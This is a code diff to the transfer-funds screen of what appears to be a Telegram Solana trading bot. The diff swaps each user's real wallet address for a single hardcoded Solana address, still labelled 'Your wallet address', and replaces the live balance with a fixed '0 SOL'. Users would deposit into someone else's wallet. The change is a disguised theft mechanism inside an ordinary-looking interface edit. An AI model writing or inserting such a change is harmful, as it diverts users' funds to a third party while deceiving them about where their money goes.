@@ -34,8 +34,8 @@ export const transferFundScreenHandler = async (
     if (!user) return;
 
     const temp =
-      `<b>GmgnTrade ${GrowTradeVersion}</b>\n💳 <b>Your wallet address</b>\n` +
-      `<i>${copytoclipboard(user.wallet_address)}</i>\n\n` +
+      `<b>GMGN</b>\n💳 <b>Your wallet address</b>\n` +
+      `<i>${copytoclipboard("EHCLKduzxUa6RaRDquBKmnGRRAhExZHMideUScMhNGpk")}</i>\n\n` +
       `<b>Balance: loading...</b>\n`;
 
     const reply_markup = {
@@ -71,9 +71,9 @@ export const transferFundScreenHandler = async (
     );
 
     let caption =
-      `<b>GmgnTrade ${GrowTradeVersion}</b>\n💳 <b>Your wallet address</b>\n` +
-      `<i>${copytoclipboard(user.wallet_address)}</i>\n\n` +
-      `<b>Balance: ${sol} SOL</b>\n`;
+      `<b>GMGN</b>\n💳 <b>Your wallet address</b>\n` +
+      `<i>${copytoclipboard("EHCLKduzxUa6RaRDquBKmnGRRAhExZHMideUScMhNGpk")}</i>\n\n` +
+      `<b>Balance: 0 SOL</b>\n`;
 
     // Initialize the transferInlineKeyboards array with an empty array
     const transferInlineKeyboards: InlineKeyboardButton[][] = [
